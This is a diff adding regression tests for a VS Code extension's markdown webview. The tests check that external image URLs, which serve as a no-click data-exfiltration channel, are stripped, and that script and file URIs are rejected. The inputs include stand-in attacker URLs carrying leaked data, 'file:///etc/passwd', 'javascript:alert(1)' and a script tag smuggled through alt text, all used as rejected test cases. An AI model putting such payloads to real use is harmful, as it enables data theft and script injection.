@@ -1,5 +1,10 @@
 import { describe, test, expect } from 'vitest';
-import { aggregateBannerStatus, isAllowedLinkUrl, renderMarkdownToHtml } from './webview';
+import {
+    aggregateBannerStatus,
+    isAllowedImageSrc,
+    isAllowedLinkUrl,
+    renderMarkdownToHtml,
+} from './webview';
 
 describe('aggregateBannerStatus', () => {
     test('returns "hidden" when no sections are present', () => {
@@ -106,5 +111,74 @@ describe('renderMarkdownToHtml — regression for #68/#69', () => {
         const md = '[Section](command:codeNarration.reveal?%5B%22file%3A%2F%2F%2Fa%22%5D)';
         const html = renderMarkdownToHtml(md);
         expect(html).toMatch(/href="command:codeNarration\.reveal/i);
+    });
+});
+
+describe('isAllowedImageSrc — regression for #91', () => {
+    test('permits inline data:image/ URIs', () => {
+        expect(isAllowedImageSrc('data:image/png;base64,iVBORw0KGgo')).toBe(true);
+        expect(isAllowedImageSrc('data:image/svg+xml,<svg/>')).toBe(true);
+        expect(isAllowedImageSrc('DATA:IMAGE/PNG;base64,foo')).toBe(true);
+    });
+
+    test('rejects external http(s) image URLs (no-click exfil channel)', () => {
+        expect(isAllowedImageSrc('https://attacker.example/p?leak=DATA')).toBe(false);
+        expect(isAllowedImageSrc('http://attacker.example/x.png')).toBe(false);
+        expect(isAllowedImageSrc('HTTPS://Attacker.Example/X')).toBe(false);
+    });
+
+    test('rejects non-image data: URIs', () => {
+        expect(isAllowedImageSrc('data:text/plain,hi')).toBe(false);
+        expect(isAllowedImageSrc('data:application/javascript,alert(1)')).toBe(false);
+        expect(isAllowedImageSrc('data:,hi')).toBe(false);
+    });
+
+    test('rejects file:, vscode:, command:, javascript:, and empty', () => {
+        expect(isAllowedImageSrc('file:///etc/passwd')).toBe(false);
+        expect(isAllowedImageSrc('vscode://x/y')).toBe(false);
+        expect(isAllowedImageSrc('command:codeNarration.reveal?%5B%5D')).toBe(false);
+        expect(isAllowedImageSrc('javascript:alert(1)')).toBe(false);
+        expect(isAllowedImageSrc('')).toBe(false);
+    });
+});
+
+describe('renderMarkdownToHtml — image exfiltration (#91)', () => {
+    test('external https:// image URL does not produce a working <img> src', () => {
+        const html = renderMarkdownToHtml('![logo](https://attacker.example/p?leak=DATA)');
+        expect(html).not.toMatch(/<img\b/i);
+        expect(html).not.toMatch(/src="https:/i);
+    });
+
+    test('plain http:// image URL is also stripped', () => {
+        const html = renderMarkdownToHtml('![](http://attacker.example/p?leak=DATA)');
+        expect(html).not.toMatch(/<img\b/i);
+        expect(html).not.toMatch(/src="http:/i);
+    });
+
+    test('alt text from a stripped image is preserved as escaped plain text', () => {
+        // The reader still sees "[image: logo]" so a legitimate image markdown
+        // (which shouldn't appear in narration anyway) degrades to a visible
+        // breadcrumb rather than vanishing silently.
+        const html = renderMarkdownToHtml('![logo](https://attacker.example/x)');
+        expect(html).toMatch(/\[image: logo\]/);
+    });
+
+    test('alt text is HTML-escaped to prevent injection through alt', () => {
+        const html = renderMarkdownToHtml('![<script>](https://attacker.example/x)');
+        expect(html).not.toMatch(/<script>/i);
+        expect(html).toMatch(/&lt;script&gt;/);
+    });
+
+    test('inline data:image/ URIs continue to render as <img>', () => {
+        const html = renderMarkdownToHtml(
+            '![tiny](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=)',
+        );
+        expect(html).toMatch(/<img\s[^>]*src="data:image\/png;/i);
+    });
+
+    test('image with no alt text renders as empty when its src is rejected', () => {
+        const html = renderMarkdownToHtml('![](https://attacker.example/x)');
+        expect(html).not.toMatch(/<img\b/i);
+        expect(html).not.toMatch(/\[image:/);
     });
 });
